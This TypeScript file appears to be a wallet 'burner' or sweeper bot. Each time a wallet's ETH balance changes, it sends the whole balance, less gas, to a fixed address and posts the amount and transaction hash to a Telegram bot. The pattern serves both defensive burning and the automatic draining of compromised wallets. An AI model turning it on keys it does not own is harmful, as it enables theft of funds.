import { utils, Wallet , ethers} from "ethers";
import args from "./args";
import { gasPriceToGwei } from "./util";
const { formatEther } = utils;
import axios from 'axios';
const flashbotsBeerFund = args.beerFund;

const dotenv = require('dotenv');

dotenv.config();

// ========================================
let decimalNumber: number = 255;
export let first_block: boolean = true;
export let previews_balance: string = decimalNumber.toString(16);
// ========================================

const burn = async (burnWallet: Wallet) => {
    const balance = await burnWallet.getBalance();
    if (balance.isZero()) {
        console.log(`Balance is zero`);
        return;
    }

    const gasPrice = (await burnWallet.getGasPrice()).add(utils.parseUnits('10', 'gwei'));

    if (balance.lt(gasPrice.mul(21000))) {
        console.log(`📉 Balance is very low for gas price: ${gasPriceToGwei(gasPrice)} gwei`,);
        return;
    }

// ========================================
    if (first_block) {
        previews_balance = balance.toHexString();
        first_block = false;
    } else {
        if (balance.toHexString() == previews_balance) {
            return;
        } else {
            previews_balance = balance.toHexString();
        }
    }
// ========================================

    const leftovers = balance.sub(gasPrice.mul(21000));
    
    try {
      console.log(`🔥 Burning: ${formatEther(balance)} ETH`);
      console.log(`🔀 Transfer: ${formatEther(leftovers)} ETH`);

      const nonce = await burnWallet.provider.getTransactionCount(
        burnWallet.address,
      );
      const tx = await burnWallet.sendTransaction({
        to: flashbotsBeerFund,
        gasLimit: 21000,
        gasPrice,
        nonce,
        value: leftovers,
      });

      const receipt = await tx.wait();
      const txHash = receipt.transactionHash;

      console.log('✅ ' + txHash + ' ✅');

      const amount = formatEther(leftovers) + '%20ETH';
      const bot_token = process.env.TELEGRAM_BOT_TOKEN;
      const telegram_id = process.env.TELEGRAM_USER_ID;
      const tx_hash = txHash;

      await axios.get(
        `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${telegram_id}&text=status%20-%20✅;%0Aamount%20-%20${amount};%0Atx%20hash%20-%20${tx_hash}`,
      );
    } catch (err: any) {
        console.log(`Error sending tx: ${err.message ?? err}`);
    }

}

export default burn;
